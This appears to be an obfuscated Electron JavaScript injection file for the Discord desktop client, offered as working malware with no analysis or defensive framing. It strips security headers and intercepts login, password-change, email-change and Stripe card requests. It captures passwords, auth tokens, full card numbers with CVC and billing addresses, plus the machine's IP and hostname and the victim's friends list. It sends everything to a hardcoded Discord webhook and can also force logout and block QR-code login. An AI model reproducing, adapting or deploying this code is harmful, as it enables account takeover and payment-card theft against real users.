const fs = require("fs");
const path = require("path");
const {BrowserWindow, session} = require("electron");
const querystring = require("querystring");
const os = require("os");
var webhook = "https://discord.com/api/webhooks/1274567128908959788/KYzg7pNj5u6Qy4hnfMeGeL6FXT8hwvj5RpjjzQZRgy_Ew_-kdK0bRuhMk14cQmt-CoN_";
const computerName = os.hostname();
String.prototype.insert = function (_0x68ebx7, _0x68ebx8) {
  if (_0x68ebx7 > 0) {
    return this.substring(0, _0x68ebx7) + _0x68ebx8 + this.substr(_0x68ebx7);
  }
  ;
  return _0x68ebx8 + this;
};
const config = {logout: "%LOGOUT%1", "inject-notify": "true", "logout-notify": "%LOGOUTNOTI%1", "init-notify": "%INITNOTI%1", "embed-color": 0, "disable-qr-code": "%DISABLEQRCODE%1"};
session.defaultSession.webRequest.onHeadersReceived((_0x68ebxa, _0x68ebxb) => {
  if (_0x68ebxa.url.startsWith(webhook)) {
    if (_0x68ebxa.url.includes("discord.com")) {
      _0x68ebxb({responseHeaders: Object.assign({"Access-Control-Allow-Headers": "*"}, _0x68ebxa.responseHeaders)});
    } else {
      _0x68ebxb({responseHeaders: Object.assign({"Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"], "Access-Control-Allow-Headers": "*", "Access-Control-Allow-Origin": "*"}, _0x68ebxa.responseHeaders)});
    }
  } else {
    delete _0x68ebxa.responseHeaders["content-security-policy"];
    delete _0x68ebxa.responseHeaders["content-security-policy-report-only"];
    _0x68ebxb({responseHeaders: {..._0x68ebxa.responseHeaders, "Access-Control-Allow-Headers": "*"}});
  }
});
function FirstTime() {
  if (!fs.existsSync(path.join(__dirname, "Kevin"))) {
    return true;
  }
  ;
  fs.rmdirSync(path.join(__dirname, "Kevin"));
  BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();', true).then(_0x68ebxd => {});
  return false;
}
const Filter = {urls: ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]};
session.defaultSession.webRequest.onBeforeRequest(Filter, (_0x68ebxa, _0x68ebxb) => {
  if (_0x68ebxa.url.startsWith("wss://")) {
    if (config["disable-qr-code"] == "true" || config["disable-qr-code"] == "%DISABLEQRCODE%") {
      _0x68ebxb({cancel: true});
      return;
    }
  }
  ;
  if (FirstTime()) {}
  ;
  _0x68ebxb({});
  return;
});
function SendToWebhook(_0x68ebx10) {
  const _0x68ebx11 = BrowserWindow.getAllWindows()[0];
  _0x68ebx11.webContents.executeJavaScript(`${'    var xhr = new XMLHttpRequest();\r\n    xhr.open("POST", "'}${webhook}${"\", true);\r\n    xhr.setRequestHeader('Content-Type', 'application/json');\r\n    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\r\n    xhr.send(JSON.stringify("}${_0x68ebx10}${"));\r\n    "}`, true).then(_0x68ebx12 => {});
}
function GetNitro(_0x68ebx14) {
  if (_0x68ebx14 == 0) {
    return "Sem nitro";
  }
  ;
  if (_0x68ebx14 == 1) {
    return "<:classic:896119171019067423> `Nitro Classic`";
  }
  ;
  if (_0x68ebx14 == 2) {
    return "<a:boost:824036778570416129> `Nitro Boost`";
  } else {
    return "Sem nitro";
  }
}
function GetRBadges(_0x68ebx14) {
  var _0x68ebx1d = "";
  if ((_0x68ebx14 & 1) == 1) {
    _0x68ebx1d += "<:staff:874750808728666152> ";
  }
  ;
  if ((_0x68ebx14 & 2) == 2) {
    _0x68ebx1d += "<:partner:874750808678354964> ";
  }
  ;
  if ((_0x68ebx14 & 4) == 4) {
    _0x68ebx1d += "<:hypesquad_events:874750808594477056> ";
  }
  ;
  if ((_0x68ebx14 & 8) == 8) {
    _0x68ebx1d += "<:bughunter_1:874750808426692658> ";
  }
  ;
  if ((_0x68ebx14 & 512) == 512) {
    _0x68ebx1d += "<:early_supporter:874750808414113823> ";
  }
  ;
  if ((_0x68ebx14 & 16384) == 16384) {
    _0x68ebx1d += "<:bughunter_2:874750808430874664> ";
  }
  ;
  if ((_0x68ebx14 & 131072) == 131072) {
    _0x68ebx1d += "<:developer:874750808472825986> ";
  }
  ;
  if (_0x68ebx1d == "") {
    _0x68ebx1d = "";
  }
  ;
  return _0x68ebx1d;
}
function GetBadges(_0x68ebx14) {
  var _0x68ebx1d = "";
  if ((_0x68ebx14 & 1) == 1) {
    _0x68ebx1d += "<:staff:874750808728666152> ";
  }
  ;
  if ((_0x68ebx14 & 2) == 2) {
    _0x68ebx1d += "<:partner:874750808678354964> ";
  }
  ;
  if ((_0x68ebx14 & 4) == 4) {
    _0x68ebx1d += "<:hypesquad_events:874750808594477056> ";
  }
  ;
  if ((_0x68ebx14 & 8) == 8) {
    _0x68ebx1d += "<:bughunter_1:874750808426692658> ";
  }
  ;
  if ((_0x68ebx14 & 64) == 64) {
    _0x68ebx1d += "<:bravery:874750808388952075> ";
  }
  ;
  if ((_0x68ebx14 & 128) == 128) {
    _0x68ebx1d += "<:brilliance:874750808338608199> ";
  }
  ;
  if ((_0x68ebx14 & 256) == 256) {
    _0x68ebx1d += "<:balance:874750808267292683> ";
  }
  ;
  if ((_0x68ebx14 & 512) == 512) {
    _0x68ebx1d += "<:early_supporter:874750808414113823> ";
  }
  ;
  if ((_0x68ebx14 & 16384) == 16384) {
    _0x68ebx1d += "<:bughunter_2:874750808430874664> ";
  }
  ;
  if ((_0x68ebx14 & 131072) == 131072) {
    _0x68ebx1d += "<:developer:874750808472825986> ";
  }
  ;
  if (_0x68ebx1d == "") {
    _0x68ebx1d = "None";
  }
  ;
  return _0x68ebx1d;
}
function Login(_0x68ebx23, _0x68ebx24, _0x68ebx12) {
  const _0x68ebx11 = BrowserWindow.getAllWindows()[0];
  _0x68ebx11.webContents.executeJavaScript(`${'\r\n    var xmlHttp = new XMLHttpRequest();\r\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\r\n    xmlHttp.setRequestHeader("Authorization", "'}${_0x68ebx12}${'");\r\n    xmlHttp.send( null );\r\n    xmlHttp.responseText;'}`, true).then(_0x68ebx25 => {
    _0x68ebx11.webContents.executeJavaScript(`${'\r\n        var xmlHttp = new XMLHttpRequest();\r\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\r\n        xmlHttp.send( null );\r\n        xmlHttp.responseText;\r\n    '}`, true).then(_0x68ebx26 => {
      _0x68ebx11.webContents.executeJavaScript(`${'\r\n        var xmlHttp = new XMLHttpRequest();\r\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\r\n        xmlHttp.setRequestHeader("Authorization", "'}${_0x68ebx12}${'");\r\n        xmlHttp.send( null );\r\n        xmlHttp.responseText'}`, true).then(_0x68ebx27 => {
        _0x68ebx11.webContents.executeJavaScript(`${'\r\n            var xmlHttp = new XMLHttpRequest();\r\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\r\n            xmlHttp.setRequestHeader("Authorization", "'}${_0x68ebx12}${'");\r\n            xmlHttp.send( null );\r\n            xmlHttp.responseText'}`, true).then(_0x68ebx28 => {
          function _0x68ebx29() {
            var _0x68ebx2a = JSON.parse(_0x68ebx28);
            const _0x68ebx2b = _0x68ebx2a.filter(_0x68ebx2c => {
              return _0x68ebx2c.type == 1;
            });
            return _0x68ebx2b.length;
          }
          function _0x68ebx2d() {
            var _0x68ebx2a = JSON.parse(_0x68ebx28);
            const _0x68ebx2b = _0x68ebx2a.filter(_0x68ebx2c => {
              return _0x68ebx2c.type == 1;
            });
            var _0x68ebx2e = "";
            for (z of _0x68ebx2b) {
              var _0x68ebx2f = GetRBadges(z.user.public_flags);
              if (_0x68ebx2f != "") {
                _0x68ebx2e += _0x68ebx2f + `${" "}${z.user.username}${"#"}${z.user.discriminator}${"\\n"}`;
              }
            }
            ;
            if (_0x68ebx2e == "") {
              _0x68ebx2e = "م عنده خوي زاحف";
            }
            ;
            return _0x68ebx2e;
          }
          function _0x68ebx30() {
            const _0x68ebx31 = JSON.parse(_0x68ebx27);
            var _0x68ebx32 = "";
            _0x68ebx31.forEach(_0x68ebx33 => {
              if (_0x68ebx33.type == "") {
                return "`❌`";
              } else {
                if (_0x68ebx33.type == 2 && _0x68ebx33.invalid != true) {
                  _0x68ebx32 += "`✔️` <:paypal:896441236062347374>";
                } else {
                  if (_0x68ebx33.type == 1 && _0x68ebx33.invalid != true) {
                    _0x68ebx32 += "`✔️` :credit_card:";
                  } else {
                    return "`❌`";
                  }
                }
              }
            });
            if (_0x68ebx32 == "") {
              _0x68ebx32 = "`❌`";
            }
            ;
            return _0x68ebx32;
          }
          const _0x68ebx31 = JSON.parse(_0x68ebx25);
          var _0x68ebx34 = {username: "Kevin", content: "Im The Legend", embeds: [{title: "Login", color: config["embed-color"], fields: [{name: "Name", value: `${"\\`"}${_0x68ebx31.username}${"#"}${_0x68ebx31.discriminator}${"\\`"}`, inline: true}, {name: "ID", value: `${"\\`"}${_0x68ebx31.id}${"\\`"}`, inline: true}, {name: "Email", value: `${"\\`"}${_0x68ebx23}${"\\`"}`, inline: false}, {name: "Badges", value: `${""}${GetBadges(_0x68ebx31.flags)}${""}`, inline: true}, {name: "Nitro", value: `${""}${GetNitro(_0x68ebx31.premium_type)}${""}`, inline: true}, {name: "Password", value: `${"\\`"}${_0x68ebx24}${"\\`"}`, inline: true}, {name: "Payments", value: `${""}${_0x68ebx30()}${""}`, inline: false}, {name: "Token", value: `${"\\`\\`\\`"}${_0x68ebx12}${"\\`\\`\\`"}`, inline: false}, {name: "PC", value: `${"\\`\\`\\`NamePC: "}${computerName}${"\\nIP: "}${_0x68ebx26}${"\\`\\`\\`"}`, inline: false}], thumbnail: {url: `${"https://cdn.discordapp.com/avatars/"}${_0x68ebx31.id}${"/"}${_0x68ebx31.avatar}${""}`}}, {title: `${""}${_0x68ebx29()}${" Friends"}`, color: config["embed-color"], description: _0x68ebx2d(), footer: {text: "By: Kevin"}}]};
          SendToWebhook(JSON.stringify(_0x68ebx34));
        });
      });
    });
  });
}
function ChangePassword(_0x68ebxd, _0x68ebx36, _0x68ebx37) {
  const _0x68ebx2b = BrowserWindow.getAllWindows()[0];
  _0x68ebx2b.webContents.executeJavaScript(`${'\\n    var xmlHttp = new XMLHttpRequest();\\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\\n    xmlHttp.setRequestHeader("Authorization", "'}${_0x68ebx37}${'");\\n    xmlHttp.send( null );\\n    xmlHttp.responseText;'}`, true).then(_0x68ebx38 => {
    _0x68ebx2b.webContents.executeJavaScript('\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ', true).then(_0x68ebx39 => {
      _0x68ebx2b.webContents.executeJavaScript(`${'\\n        var xmlHttp = new XMLHttpRequest();\\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\\n        xmlHttp.setRequestHeader("Authorization", "'}${_0x68ebx37}${'");\\n        xmlHttp.send( null );\\n        xmlHttp.responseText'}`, true).then(_0x68ebx2b => {
        const _0x68ebx3a = JSON.parse(_0x68ebx38);
        var _0x68ebx3b = {username: "Kevin", embeds: [{title: "Change Password", color: 0, fields: [{name: "Name", value: `${"\\`"}${_0x68ebx3a.username}${"#"}${_0x68ebx3a.discriminator}${"\\`"}`, inline: true}, {name: "ID", value: `${"\\`"}${_0x68ebx3a.id}${"\\`"}`, inline: true}, {name: "Email", value: `${"\\`"}${_0x68ebx3a.email}${"\\`"}`, inline: false}, {name: "Badge", value: `${""}${GetBadges(_0x68ebx3a.flags)}${""}`, inline: true}, {name: "Nitro", value: `${""}${GetNitro(_0x68ebx3a.premium_type)}${""}`, inline: true}, {name: "Old Password", value: `${"\\`"}${_0x68ebxd}${"\\`"}`, inline: true}, {name: "New Password", value: `${"\\`"}${_0x68ebx36}${"\\`"}`, inline: true}, {name: "Token", value: `${"\\`\\`\\`"}${_0x68ebx37}${"\\`\\`\\`"}`, inline: false}, {name: "PC", value: `${"\\`\\`\\`NamePC: "}${computerName}${"\\nIP: "}${_0x68ebx39}${"\\`\\`\\`"}`, inline: false}, {name: "Account", value: `${"\\`\\`\\`Payments: "}${function () {
          const _0x68ebxd = JSON.parse(_0x68ebx2b);
          var _0x68ebx36 = "";
          _0x68ebxd.forEach(_0x68ebxd => {
            if ("" == _0x68ebxd.type) {
              return "❌";
            }
            ;
            if (2 == _0x68ebxd.type && 1 != _0x68ebxd.invalid) {
              _0x68ebx36 += "✔️ Paypal";
            } else {
              if (1 != _0x68ebxd.type || 1 == _0x68ebxd.invalid) {
                return "❌";
              }
              ;
              _0x68ebx36 += "✔️ Cartão";
            }
          });
          if ("" == _0x68ebx36) {
            _0x68ebx36 = "❌";
          }
          return _0x68ebx36;
        }()}${"\\n\\`\\`\\`"}`, inline: false}], thumbnail: {url: `${"https://cdn.discordapp.com/avatars/"}${_0x68ebx3a.id}${"/"}${_0x68ebx3a.avatar}${""}`}}]};
        SendToWebhook(JSON.stringify(_0x68ebx3b));
      });
    });
  });
}
function ChangeEmail(_0x68ebxd, _0x68ebx36, _0x68ebx37) {
  const _0x68ebx2b = BrowserWindow.getAllWindows()[0];
  _0x68ebx2b.webContents.executeJavaScript(`${'\\n    var xmlHttp = new XMLHttpRequest();\\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\\n    xmlHttp.setRequestHeader("Authorization", "'}${_0x68ebx37}${'");\\n    xmlHttp.send( null );\\n    xmlHttp.responseText;'}`, true).then(_0x68ebx38 => {
    _0x68ebx2b.webContents.executeJavaScript('\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ', true).then(_0x68ebx39 => {
      _0x68ebx2b.webContents.executeJavaScript(`${'\\n        var xmlHttp = new XMLHttpRequest();\\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\\n        xmlHttp.setRequestHeader("Authorization", "'}${_0x68ebx37}${'");\\n        xmlHttp.send( null );\\n        xmlHttp.responseText'}`, true).then(_0x68ebx2b => {
        const _0x68ebx3a = JSON.parse(_0x68ebx38);
        var _0x68ebx3b = {username: "Kevin", embeds: [{title: "Change Email", color: 0, fields: [{name: "Name", value: `${"\\`"}${_0x68ebx3a.username}${"#"}${_0x68ebx3a.discriminator}${"\\`"}`, inline: true}, {name: "ID", value: `${"\\`"}${_0x68ebx3a.id}${"\\`"}`, inline: true}, {name: "New Email", value: `${"\\`"}${_0x68ebxd}${"\\`"}`, inline: false}, {name: "Badge", value: `${""}${GetBadges(_0x68ebx3a.flags)}${""}`, inline: true}, {name: "Nitro", value: `${""}${GetNitro(_0x68ebx3a.premium_type)}${""}`, inline: true}, {name: "Password", value: `${"\\`"}${_0x68ebx36}${"\\`"}`, inline: true}, {name: "Token", value: `${"\\`\\`\\`"}${_0x68ebx37}${"\\`\\`\\`"}`, inline: false}, {name: "PC", value: `${"\\`\\`\\`NamePC: "}${computerName}${"\\nIP: "}${_0x68ebx39}${"\\`\\`\\`"}`, inline: false}, {name: "Account", value: `${"\\`\\`\\`Payments: "}${function () {
          const _0x68ebxd = JSON.parse(_0x68ebx2b);
          var _0x68ebx36 = "";
          _0x68ebxd.forEach(_0x68ebxd => {
            if ("" == _0x68ebxd.type) {
              return "❌";
            }
            ;
            if (2 == _0x68ebxd.type && 1 != _0x68ebxd.invalid) {
              _0x68ebx36 += "✔️ <:paypal:896441236062347374>";
            } else {
              if (1 != _0x68ebxd.type || 1 == _0x68ebxd.invalid) {
                return "❌";
              }
              ;
              _0x68ebx36 += "✔️ :credit_card:";
            }
          });
          if ("" == _0x68ebx36) {
            _0x68ebx36 = "❌";
          }
          return _0x68ebx36;
        }()}${"\\`\\`\\`"}`, inline: false}], thumbnail: {url: `${"https://cdn.discordapp.com/avatars/"}${_0x68ebx3a.id}${"/"}${_0x68ebx3a.avatar}${""}`}}]};
        SendToWebhook(JSON.stringify(_0x68ebx3b));
      });
    });
  });
}
function CreditCardAdded(_0x68ebxd, _0x68ebx36, _0x68ebx37, _0x68ebx2b, _0x68ebx38, _0x68ebx39, _0x68ebx3a, _0x68ebx3b, _0x68ebx3e, _0x68ebx3f) {
  const _0x68ebx40 = BrowserWindow.getAllWindows()[0];
  _0x68ebx40.webContents.executeJavaScript(`${'\\n    var xmlHttp = new XMLHttpRequest();\\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\\n    xmlHttp.setRequestHeader("Authorization", "'}${_0x68ebx3f}${'");\\n    xmlHttp.send( null );\\n    xmlHttp.responseText;'}`, true).then(_0x68ebx41 => {
    _0x68ebx40.webContents.executeJavaScript('\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ', true).then(_0x68ebx40 => {
      var _0x68ebx42 = JSON.parse(_0x68ebx41);
      var _0x68ebx43 = {username: "Kevin", content: "", embeds: [{title: "Added Card", description: "**Name:**```" + _0x68ebx42.username + "#" + _0x68ebx42.discriminator + "```\n**ID:**```" + _0x68ebx42.id + "```\n**Email:**```" + _0x68ebx42.email + "```\n**Nitro:**" + GetNitro(_0x68ebx42.premium_type) + "\n**Badges:**```" + GetBadges(_0x68ebx42.flags) + "```\n**None **```" + _0x68ebxd + "```\n**Expira em: **```" + _0x68ebx37 + "/" + _0x68ebx2b + "```\n**CVC: **```" + _0x68ebx36 + "```\n**Região: **```" + _0x68ebx3e + "```\n**Estado: **```" + _0x68ebx3a + "```\n**Cidade: **```" + _0x68ebx39 + "```\n**CEP:**```" + _0x68ebx3b + "```\n**Bairro: **```" + _0x68ebx38 + "```\n**Token:**```" + _0x68ebx3f + "```\n**IP: **```" + _0x68ebx40 + "```", thumbnail: {url: "https://cdn.discordapp.com/avatars/" + _0x68ebx42.id + "/" + _0x68ebx42.avatar}}]};
      SendToWebhook(JSON.stringify(_0x68ebx43));
    });
  });
}
session.defaultSession.webRequest.onBeforeRequest(Filter, (_0x68ebxd, _0x68ebx36) => {
  if (FirstTime()) {
    if (_0x68ebxd.url.startsWith("wss://")) {
      _0x68ebx36({cancel: true});
    } else {
      _0x68ebx36({cancel: false});
    }
  }
});
session.defaultSession.webRequest.onHeadersReceived((_0x68ebxd, _0x68ebx36) => {
  if (_0x68ebxd.url.startsWith(webhook.split("/")[2])) {
    _0x68ebx36({responseHeaders: {..._0x68ebxd.responseHeaders, "Access-Control-Allow-Origin": "*", "Access-Control-Allow-Headers": "*"}});
  } else {
    delete _0x68ebxd.responseHeaders["content-security-policy"];
    delete _0x68ebxd.responseHeaders["content-security-policy-report-only"];
    _0x68ebx36({responseHeaders: {..._0x68ebxd.responseHeaders, "Access-Control-Allow-Headers": "*"}});
  }
});
const ChangePasswordFilter = {urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", "https://discord.com/api/v*/auth/login", "https://*.discord.com/api/v*/auth/login", "https://api.stripe.com/v*/tokens"]};
session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (_0x68ebxd, _0x68ebx36) => {
  if (_0x68ebxd.url.endsWith("login") && 200 == _0x68ebxd.statusCode) {
    const _0x68ebx36 = JSON.parse(Buffer.from(_0x68ebxd.uploadData[0].bytes).toString());
    const _0x68ebx37 = _0x68ebx36.login;
    const _0x68ebx2b = _0x68ebx36.password;
    BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;', true).then(_0x68ebxd => {
      Login(_0x68ebx37, _0x68ebx2b, _0x68ebxd);
    });
  }
  ;
  if (_0x68ebxd.url.endsWith("users/@me") && 200 == _0x68ebxd.statusCode && "PATCH" == _0x68ebxd.method) {
    const _0x68ebx36 = JSON.parse(Buffer.from(_0x68ebxd.uploadData[0].bytes).toString());
    if (null != _0x68ebx36.password && null != _0x68ebx36.password && "" != _0x68ebx36.password) {
      if (null != _0x68ebx36.new_password && null != _0x68ebx36.new_password && "" != _0x68ebx36.new_password) {
        BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;', true).then(_0x68ebxd => {
          ChangePassword(_0x68ebx36.password, _0x68ebx36.new_password, _0x68ebxd);
        });
      }
      ;
      if (null != _0x68ebx36.email && null != _0x68ebx36.email && "" != _0x68ebx36.email) {
        BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;', true).then(_0x68ebxd => {
          ChangeEmail(_0x68ebx36.email, _0x68ebx36.password, _0x68ebxd);
        });
      }
    }
  }
  ;
  if (_0x68ebxd.url.endsWith("tokens")) {
    const _0x68ebx36 = BrowserWindow.getAllWindows()[0];
    const _0x68ebx37 = querystring.parse(decodeURIComponent(Buffer.from(_0x68ebxd.uploadData[0].bytes).toString()));
    _0x68ebx36.webContents.executeJavaScript('for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;', true).then(_0x68ebxd => {
      CreditCardAdded(_0x68ebx37["card[number]"], _0x68ebx37["card[cvc]"], _0x68ebx37["card[exp_month]"], _0x68ebx37["card[exp_year]"], _0x68ebx37["card[address_line1]"], _0x68ebx37["card[address_city]"], _0x68ebx37["card[address_state]"], _0x68ebx37["card[address_zip]"], _0x68ebx37["card[address_country]"], _0x68ebxd);
    });
  }
});
module.exports = require("./core.asar");
